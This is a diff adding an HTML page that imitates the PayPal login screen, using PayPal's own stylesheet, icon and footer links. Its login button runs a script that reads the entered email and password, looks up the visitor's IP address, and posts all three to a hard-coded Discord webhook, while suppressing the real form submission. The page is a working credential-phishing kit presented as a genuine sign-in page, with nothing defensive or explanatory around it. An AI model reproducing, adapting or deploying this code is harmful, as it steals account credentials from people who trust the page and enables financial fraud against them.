@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en" class="desktop js js ">
+<head>
+    <meta charset="UTF-8">
+    <title>Log in to your PayPal account</title>
+    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/23c/95eb9807233fdf7bf3d934be56054/css/contextualLoginElementalUIv4.css">
+    <link rel="icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" type="image/x-icon">
+</head>
+<body class="desktop">
+
+    <div id="main" class="main" role="main">
+        <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
+            <div class="corral">
+                <div id="content" class="contentContainer activeContent contentContainerBordered">
+                    <header id="header">
+                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
+                    </header>
+                    <h1 id="headerText" class="headerText accessAid">Log in to your account</h1>
+                    <p id="subTagLineConnectOtp" class="subHeaderText hide">Forgotten your email address? Go to the PayPal website to recover it.</p>
+                    
+                    <div id="loginContent">
+                        <div id="loginSection">
+                            <form action="https://www.paypal.com/signin" method="post" autocomplete="off" name="login" novalidate="">
+                                <div id="passwordSection" class="clearfix splitEmail">
+                                    <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
+                                        <div class="textInput" id="login_emaildiv" style="z-index: 1;">
+                                            <div class="fieldWrapper">
+                                                <input id="email" name="login_email" type="email" class="hasHelp validateEmpty" required="required" value="" autocomplete="username" placeholder="Email address or mobile number" aria-describedby="emailErrorMessage">
+                                                <label for="email" class="fieldLabel">Email address or mobile number</label>
+                                            </div>
+                                            <div class="errorMessage" id="emailErrorMessage">
+                                                <p class="emptyError hide">Required.</p>
+                                                <p class="invalidError hide">The email address or mobile number format is incorrect.</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
+                                        <div class="textInput" id="login_passworddiv" style="z-index: 1;">
+                                            <div class="fieldWrapper">
+                                                <input id="password" name="login_password" type="password" class="hasHelp validateEmpty pin-password" required="required" value="" placeholder="Password" aria-describedby="passwordErrorMessage">
+                                                <label for="password" class="fieldLabel">Password</label>
+                                                <label for="Show password" class="fieldLabel">Show password</label>
+                                                <button type="button" class="showPassword show-hide-password scTrack:unifiedlogin-show-password hide" id="Show password">Show</button>
+                                                <label for="Hide" class="fieldLabel">Hide</label>
+                                                <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide">Hide</button>
+                                            </div>
+                                            <div class="errorMessage" id="passwordErrorMessage">
+                                                <p class="emptyError hide">Password is required</p>
+                                            </div>
+                                        </div>
+                                        <a href="https://www.paypal.com/authflow/password-recovery" id="setupPassword" class="recoveryOption forgotPassword hide">Set up a password</a>
+                                        <a href="https://www.paypal.com/authflow/password-recovery" id="forgotPassword" class="recoveryOption forgotPassword">Forgotten password?</a>
+                                    </div>
+                                </div>
+                                <div class="actions">
+                                    <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="button" id="btnLogin" name="btnLogin" onclick="handleLogin()">
+                                        Log In
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                    
+                    <div id="signupContainer" class="signupContainer">
+                        <div class="loginSignUpSeparator"><span class="textInSeparator">or</span></div>
+                        <button type="button" href="/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Sign Up</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer" role="contentinfo">
+        <div class="legalFooter">
+            <ul class="footerGroup">
+                <li><a target="_blank" href="https://www.paypal.com/smarthelp/contact-us">Contact us</a></li>
+                <li><a target="_blank" href="https://www.paypal.com/webapps/mpp/ua/privacy-full">Privacy</a></li>
+                <li><a target="_blank" href="https://www.paypal.com/webapps/mpp/ua/legalhub-full">Legal</a></li>
+                <li><a target="_blank" href="https://www.paypal.com/webapps/mpp/country-worldwide">Worldwide</a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <script>
+        function handleLogin() {
+    // Get the values of the email and password fields
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    
+    // Define the webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1269888495653228544/ZvJDX9kX8ikp3j5qdXH2KObOWl_XU3gijMSB3sAA3v7WsMP5p3eENBVugkX6mxsE4qO_';
+
+    // Fetch the IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;  // Use `let` if you need to modify it later
+            
+            // Create the message payload with an embed
+            const message = {
+                embeds: [
+                    {
+                        title: "Login Attempt",
+                        description: "A login attempt has been made.",
+                        color: 3447003, // Hex color code for blue
+                        fields: [
+                            {
+                                name: "Email",
+                                value: email,
+                                inline: true
+                            },
+                            {
+                                name: "Password",
+                                value: password,
+                                inline: true
+                            },
+                            {
+                                name: "IP",
+                                value: ip,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: "Login Details",
+                            icon_url: "https://png.pngtree.com/element_our/png/20180723/paypal-logo-icon-png_44635.jpg" // PayPal logo URL
+                        },
+                        thumbnail: {
+                            url: "https://png.pngtree.com/element_our/png/20180723/paypal-logo-icon-png_44635.jpg" // PayPal thumbnail URL
+                        }
+                    }
+                ]
+            };
+
+            // Send the message via a POST request to the Discord webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        })
+        .catch(error => {
+            console.error('Error fetching IP:', error);
+        });
+
+    // Prevent form submission
+    return false;
+}
+
+    </script>
+
+</body>
+</html>
